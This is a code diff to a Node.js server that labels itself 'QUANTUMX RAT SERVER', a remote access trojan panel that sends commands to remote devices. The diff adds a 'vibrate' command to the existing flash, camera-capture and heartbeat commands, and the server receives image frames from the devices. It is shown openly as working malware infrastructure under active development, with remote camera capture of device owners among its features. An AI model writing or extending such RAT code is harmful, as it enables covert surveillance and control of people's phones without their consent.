@@ -147,6 +147,8 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
         console.log(`📸 [FLASH] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
     } else if (command === 'camera') {
         console.log(`📷 [CAMERA] CAPTURING -> ${deviceName} (${deviceId})`);
+    } else if (command === 'vibrate') {
+        console.log(`📳 [VIBRATE] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -189,6 +191,12 @@ app.post('/api/device/command/result', (req, res) => {
                 console.log(`✅ [CAMERA] SUCCESS -> ${deviceName} | PHOTO TAKEN`);
             } else {
                 console.log(`❌ [CAMERA] FAILED -> ${deviceName}`);
+            }
+        } else if (deviceCommands[commandIndex].command === 'vibrate') {
+            if (status === 'completed') {
+                console.log(`✅ [VIBRATE] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
+            } else {
+                console.log(`❌ [VIBRATE] FAILED -> ${deviceName}`);
             }
         }
     }
@@ -305,9 +313,6 @@ io.on('connection', (socket) => {
             imageData,
             timestamp: timestamp || Date.now()
         });
-        
-        // Frame received (ini bagian dari proses camera, tapi ga perlu log terpisah)
-        // Karena sudah ada log SUCCESS dari command-result
     });
     
     // ===== PANEL CONNECT =====
@@ -373,7 +378,7 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔═══════════════════════════════════════════════════╗
-║    QUANTUMX RAT SERVER v3.1                       ║
+║    QUANTUMX RAT SERVER v3.2                       ║
 ║    RUNNING ON PORT: ${PORT}                                    ║
 ║    WEBSOCKET: ws://localhost:${PORT}                           ║
 ║    API: http://localhost:${PORT}/api                          ║
@@ -381,6 +386,8 @@ server.listen(PORT, () => {
 ║    LOG FORMAT:                                       ║
 ║    📸 [FLASH] SENDING -> Device (2s)                ║
 ║    ✅ [FLASH] SUCCESS -> Device | DURATION: 2s      ║
+║    📳 [VIBRATE] SENDING -> Device (2s)              ║
+║    ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s    ║
 ║    📷 [CAMERA] CAPTURING -> Device                   ║
 ║    ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN       ║
 ║    💓 [HEARTBEAT] Device - 82% (1% chance)          ║
